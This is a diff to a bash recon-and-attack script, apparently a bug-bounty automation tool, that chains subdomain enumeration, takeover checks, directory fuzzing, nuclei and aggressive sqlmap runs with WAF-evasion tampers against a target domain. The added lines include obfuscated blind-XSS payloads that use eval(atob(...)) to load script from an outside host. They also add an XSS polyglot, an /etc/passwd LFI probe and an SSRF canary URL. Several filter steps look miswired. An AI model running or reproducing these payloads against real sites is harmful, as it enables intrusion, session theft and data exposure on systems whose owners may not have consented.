@@ -23,6 +23,7 @@ if [ -z "$3" ]
 fi
 
 if [ ! -d "$2" ]; then
+	cd /var/www/html/
         mkdir $2
 fi
 
@@ -30,119 +31,182 @@ RED="\e[31m"
 BOLD="\e[1m"
 NORMAL="\e[0m"
 GREEN="\e[92m"
+echo -e "${RED}\n ________________ _______ _______ _______ _       _______ _______ _______ _______ __    __"
+echo -e "${RED}\n \__   __(  ____ (  ___  / ___   (  ___  ( (    /(  ____ (  ____ (  ____ (  ___  ( (    /|"
+echo -e "${RED}\n   ) (  | (    )| (   ) \/   )  | (   ) |  \  ( | (    )| (    \| (    \| (   ) |  \  ( |"
+echo -e "${RED}\n   | |  | (____)| |   | |   /   | |   | |   \ | | (____)| (__   | |     | |   | |   \ | |"
+echo -e "${RED}\n   | |  |     __| |   | |  /   /| |   | | (\ \) |     __|  __)  | |     | |   | | (\ \) |"
+echo -e "${RED}\n   | |  | (\ (  | |   | | /   / | |   | | | \   | (\ (  | (     | |     | |   | | | \   |"
+echo -e "${RED}\n   | |  | ) \ \_| (___) |/   (_/| (___) | )  \  | ) \ \_| (____/| (____/| (___) | )  \  |"
+echo -e "${RED}\n   )_(  |/   \__(_______(_______(_______|/    )_|/   \__(_______(_______(_______|/    )_)"
 
-echo -e ${GREEN}"\n          .                                                      . "
-echo -e ${GREEN}"        .n                   .                 .                  n. "
-echo -e ${GREEN}"  .   .dP                  dP                   9b                 9b.    . "
-echo -e ${GREEN}" 4    qXb         .       dX                     Xb       .        dXp     t "
-echo -e ${GREEN}"dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb "
-echo -e ${GREEN}"9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP "
-echo -e ${GREEN}" 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP "
-echo -e ${GREEN}"  v9XXXXXXXXXXXXXXXXXXXXXi-   -vOOO8b   d8OOOi-   -vXXXXXXXXXXXXXXXXXXXXXPi "
-echo -e ${GREEN}"    v9XXXXXXXXXXXPi v9XXi   DIE    v98v8Pi  HUMAN   vXXPi v9XXXXXXXXXXXPi "
-echo -e ${GREEN}"        -------       9X.          .db|db.          .XP       ------- "
-echo -e ${GREEN}"                        )b.  .dbo.dPivviv9b.odb.  .dX( "
-echo -e ${GREEN}"                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb. "
-echo -e ${GREEN}"                     dXXXXXXXXXXXPi   .   v9XXXXXXXXXXXb "
-echo -e ${GREEN}"                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb "
-echo -e ${GREEN}"                    9XXbi   vXXXXXb.dX|Xb.dXXXXXi   vdXXP "
-echo -e ${GREEN}"                     vi      9XXXXXX(   )XXXXXXP      vi "
-echo -e ${GREEN}"                              XXXX X.vvi.X XXXX "
-echo -e ${GREEN}"                              XP^Xivb   divX^XX "
-echo -e ${GREEN}"                              X. 9  v   i  P )X "
-echo -e ${GREEN}"                              vb  v       i  di "
-echo -e ${GREEN}"                               v             i "
-
-echo -e "${RED}\n                          "
-echo -e "${RED}                            "
 echo -e "${NORMAL}${BOLD}\n                           coded by ${GREEN}TROZON${NORMAL}${BOLD} with ${RED}<3"
 sleep 2
 
 cd $2/
-echo -e "${NORMAL}${BOLD}\nStarting scan on ${RED}$1${NORMAL}${BOLD}... \n"
+echo -e "${NORMAL}${BOLD}\nStarting scan on ${RED}$1${NORMAL}${BOLD}... \n" | notify
 sleep 2
 
-echo -e "${NORMAL}Starting ${GREEN}Assetfinder${NORMAL} on $1..."
+echo -e "${NORMAL}Starting ${GREEN}Assetfinder${NORMAL} on $1..." | notify
 assetfinder --subs-only $1 |sort -u > $2-assetfinder.txt
+pwd
 sleep 2
 
-echo -e "${NORMAL}Starting ${GREEN}Sublist3r${NORMAL} on $1..."
-python3 ~/tools/Sublist3r/sublist3r.py -d $1 -o $2-sublister.txt > /dev/null
+echo -e "${NORMAL}Starting ${GREEN}Sublist3r${NORMAL} on $1..." | notify
+python3 ~/tools/Sublist3r/sublist3r.py -d $1 -o $2-sublister.txt
 sleep 2
 
-echo -e "${BOLD}\nFiltering subdomains of ${RED}$1... \n ${NORMAL} "
-cat $2-sublister.txt $2-assetfinder.txt |grep -v "*" |sort -u > $2-finalsubdomains.txt
+echo -e "${NORMAL}Starting ${GREEN}Subfinder${NORMAL} on $1..." | notify
+subfinder -d $1 -o $2-subfinder.txt
 sleep 2
 
-echo -e "${NORMAL}Starting ${GREEN}Httprobe${NORMAL} on all filtered subdomains..."
+echo -e "${BOLD}\nFiltering subdomains of ${RED}$1... \n ${NORMAL} " | notify
+cat $2-sublister.txt $2-subfinder.txt $2-assetfinder.txt |grep -v "*" |sort -u > $2-finalsubdomains.txt
+sleep 2
+
+
+echo -e "${NORMAL}Starting ${GREEN}Httprobe${NORMAL} on all filtered subdomains..." | notify
 cat $2-finalsubdomains.txt | sort -u | uniq -u | httprobe > $2-alive.txt
 sleep 2
 
-echo -e "${NORMAL}Starting ${GREEN}Get-titles${NORMAL} to collect all titles of all subdomains..."
+echo -e "${NORMAL}Starting ${GREEN}Get-titles${NORMAL} to collect all titles of all subdomains..." | notify
+pwd
 cat $2-alive.txt | httpx -title > $2-gettitle.txt
 sleep 2
 
-echo -e "${NORMAL}Starting ${GREEN}subdomain takeover${NORMAL} scan on $1..."
+echo -e "${NORMAL}Starting ${GREEN}subdomain takeover${NORMAL} scan on $1..." | notify
 subjack -w $2-finalsubdomains.txt -t 20 -ssl -c ~/tools/fingerprints.json -o $2-subjack.txt
 subzy -targets $2-finalsubdomains.txt -hide_fails --verify_ssl -concurrency 20 | sort -u > $2-subzy.txt
 sleep 2
 
-echo -e "${NORMAL}${BOLD}Starting ${GREEN}$3${NORMAL}${BOLD} param output on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}Running Aquatone for STKO ${NORMAL} on $1... ${NORMAL} " | notify
+aquatone-discover -d $1 --disable-collectors dictionary
+aquatone-scan -d $1
+aquatone-takeover -d $1
 sleep 2
-cat $2-finalsubdomains.txt | $3 > $2-$3.txt
 
-echo -e "Starting ${GREEN}XSS${NORMAL} param filtering on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}Running Aquatone for Screenshots ${NORMAL} on $1... ${NORMAL}" | notify
+cat $2-alive.txt | aquatone -chrome-path /snap/bin/chromium -out $2-aqua_out/ -threads 5 -silent &> /dev/null
+chmod 777 $2-aqua_out/screenshots/http*
+sleep 2
+
+echo -e "Starting ${GREEN}Running Hakrawler and Paramspider ${NORMAL} on $1... ${NORMAL} " | notify
+cat $2-finalsubdomains.txt | hakrawler -depth 5 -plain -wayback | anew $2-hakrawler.txt &> /dev/null
+python3 ~/tools/ParamSpider/paramspider.py --domain $2 --exclude woff,css,js,png,svg,jpg --level high --quiet --output $2-paramspider.txt &> /dev/null
+cat output/$2-paramspider.txt $2-hakrawler.txt | sort -u | uniq -u > hak_paramspider-params.txt
+rm $2-hakrawler.txt
+rm -rf output/
+sleep 2
+
+echo -e "${NORMAL}${BOLD}Starting ${GREEN}$3${NORMAL}${BOLD} param output on $1... ${NORMAL} " | notify
+pwd
+sleep 2
+cat $2-finalsubdomains.txt | $3 > $2-$3_all.txt
+
+sleep 2
+cat $2-$3_all.txt | qsreplace 'FUZZ' | sort -u | tee $2-$3.txt
+
+echo -e "Starting ${GREEN}XSS${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
 cat $2-$3.txt | gf xss > $2-xss.txt
 
-echo -e "Starting ${GREEN}SSRF${NORMAL} param filtering on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}SSRF${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
 cat $2-$3.txt | gf ssrf > $2-ssrf.txt
 
-echo -e "Starting ${GREEN}SSTI${NORMAL} param filtering on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}SSTI${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
 cat $2-$3.txt | gf ssti > $2-ssti.txt
 
-echo -e "Starting ${GREEN}REDIRECT${NORMAL} param filtering on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}REDIRECT${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
 cat $2-$3.txt | gf redirect > $2-redirect.txt
 
-echo -e "Starting ${GREEN}SQLi${NORMAL} param filtering on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}SQLi${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
 cat $2-$3.txt | gf sqli > $2-sqli.txt
 
-echo -e "Starting ${GREEN}LFI${NORMAL} param filtering on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}LFI${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
 cat $2-$3.txt | gf sqli > $2-lfi.txt
 
-echo -e "Starting ${GREEN}RCE${NORMAL} param filtering on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}RCE${NORMAL} param filtering on $1... ${NORMAL} " | notify
 sleep 2
 cat $2-$3.txt | gf sqli > $2-rce.txt
 
-echo -e "Starting ${GREEN}Directory Fuzzing${NORMAL} on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}Directory Fuzzing${NORMAL} on $1... ${NORMAL} " | notify
 sleep 2
-ffuf -w ~/wordlist/dicc.txt -u https://$1/FUZZ > $2-Dirfuzz.txt
-~/tools/dirsearch/dirsearch.py dir -u $1/ -e php,aspx,docx,pdf,txt,js,json > $2-Dirsearch.txt
+cat $2-gettitle.txt | grep 'Not Found\|Moved Permanently\|403 - Forbidden\|404\|403\|Apache\|Service Unavailable\|403\|Demo\|test\|dev\|Welcome\|FTP Root\|Access Denied' | cut -d ' ' -f 1 | while read url;do ffuf -w ~/wordlist/dicc.txt -u $url/FUZZ -mc 200; done | tee $2-Dirfuzz.txt
+cat $2-gettitle.txt | grep 'Not Found\|Moved Permanently\|403 - Forbidden\|404\|403\|Apache\|Service Unavailable\|403\|Demo\|test\|dev\|Welcome\|FTP Root\|Access Denied' | cut -d ' ' -f 1 | while read url;do ~/tools/dirsearch/dirsearch.py dir -u $url/ -e php,log,sql,gz,zip,aspx,docx,pdf,txt,js,json; done | tee $2-Dirsearch.txt
 
-echo -e "Starting ${GREEN}Hakrawler for js files ${NORMAL} on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}Nuclei ${NORMAL} on $1... ${NORMAL} " | notify
+sleep 2
+cat $2-finalsubdomains.txt | nuclei -t ~/nuclei-templates/  --severity medium,high,critical | tee $2-subdomains-nuclei.txt | notify
+cat $2-$3.txt | nuclei -t ~/nuclei-templates/  --severity medium,high,critical | tee $2-wayback-nuclei.txt | notify
+
+echo -e "Starting ${GREEN}Hakrawler for js files ${NORMAL} on $1... ${NORMAL} " | notify
 sleep 2
 hakrawler -depth 4 -js -plain -url $1 > $2-jsfiles.txt
 
-echo -e "Starting ${GREEN}Hakrawler for Links ${NORMAL} on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}Hakrawler for Links ${NORMAL} on $1... ${NORMAL} " | notify
 sleep 2
 hakrawler -depth 4 -js -linkfinder -plain -url $1 | tee $2-jslinks.txt
 
-echo -e "Starting ${GREEN}Git Hound ${NORMAL} on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}SQLMap${NORMAL} on $1... ${NORMAL} " | notify
+sleep 2
+~/tools/sqlmap-dev/sqlmap.py -m $2-sqli.txt --dbs --batch --level=3 --risk=3 --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,ifnull2ifisnull,modsecurityversioned > $2-sqlmapresult.txt
+
+echo -e "Starting ${GREEN}XSSHunter${NORMAL} on $1... ${NORMAL} " | notify
+sleep 2
+cat $2-$3.txt | grep '=' | Gxss | dalfox pipe | tee $2-xssresult.txt
+cat $2-$3.txt | grep '=' | qsreplace '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdHJvem9uLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>' | tee $2-xsshunterforfuzz.txt 
+ffuf -u FUZZ -w $2-xsshunterforfuzz.txt -r
+rm -r $2-xsshunterforfuzz.txt
+
+sleep 2
+cat $2-$3.txt | grep '=' | qsreplace '"><script src=https://trozon.xss.ht></script>' | tee $2-xsshunterforfuzz.txt
+ffuf -u FUZZ -w $2-xsshunterforfuzz.txt
+rm -r $2-xsshunterforfuzz.txt -r
+
+sleep 2
+cat $2-$3.txt | grep '=' | qsreplace "javascript:eval('var a=document.createElement(\'script\');a.src=\'https://trozon.xss.ht\';document.body.appendChild(a)')" | tee $2-xsshunterforfuzz.txt
+ffuf -u FUZZ -w $2-xsshunterforfuzz.txt
+rm -r $2-xsshunterforfuzz.txt -r
+
+sleep 2
+cat $2-$3.txt | grep '=' | qsreplace '"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdHJvem9uLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>' | tee $2-xsshunterforfuzz.txt
+ffuf -u FUZZ -w $2-xsshunterforfuzz.txt -r 
+rm -r $2-xsshunterforfuzz.txt
+
+sleep 2
+cat $2-$3.txt | grep '=' | qsreplace '"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdHJvem9uLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;>' | tee $2-xsshunterforfuzz.txt
+ffuf -u FUZZ -w $2-xsshunterforfuzz.txt -r
+rm -r $2-xsshunterforfuzz.txt
+
+echo -e "Starting ${GREEN}LFI Scan${NORMAL} on $1... ${NORMAL} " | notify
+sleep 2
+cat $3.txt | gf lfi | grep '=' | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | notify
+
+echo -e "Starting ${GREEN}XSSHunter${NORMAL} on $1... ${NORMAL} " | notify
+sleep 2
+cat $2-$3.txt | grep '=' | qsreplace 'http://canarytokens.com/articles/traffic/qoqfacgu03l6ft77mwk0g4fiy/contact.php' > $2-ssrf_OR_result.txt
+ffuf -u FUZZ -w $2-ssrf_OR_result.txt -r
+
+echo -e "Starting ${GREEN}XSS Polyglot${NORMAL} on $1... ${NORMAL} " | notify
+sleep 2
+cat $2-$3.txt | grep '=' | qsreplace '<iframe src="
+jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e
+"></iframe>' > $2-xss-polyglot.txt
+#open in firefox multitab extension
+
+echo -e "Starting ${GREEN}Git Hound ${NORMAL} on $1... ${NORMAL} " | notify
 sleep 2
 git-hound --subdomain-file $2-finalsubdomains.txt --threads 50 | tee $2-githound.txt
 
-echo -e "Starting ${GREEN}Broken Link Checker ${NORMAL} on $1... ${NORMAL} "
+echo -e "Starting ${GREEN}Broken Link Checker ${NORMAL} on $1... ${NORMAL} " | notify
 sleep 2
 blc -rof --filter-level 3 https://$1/ | tee $2-brokenlinks.txt
 
-echo -e "Starting ${GREEN}Running Dalfox ${NORMAL} on $1... ${NORMAL} "
 sleep 2
-cat $2-xss.txt | dalfox pipe | tee $2-dalfox.txt
-
-sleep 2
-echo -e "${BOLD}\nAll your outputs are save in ${GREEN}$2/ \n"
+echo -e "${BOLD}\nAll your outputs are save in ${GREEN}$2/\n" | notify
+echo -e "THANK YOU FOR USING TROZORECON ${NORMAL}" | notify 
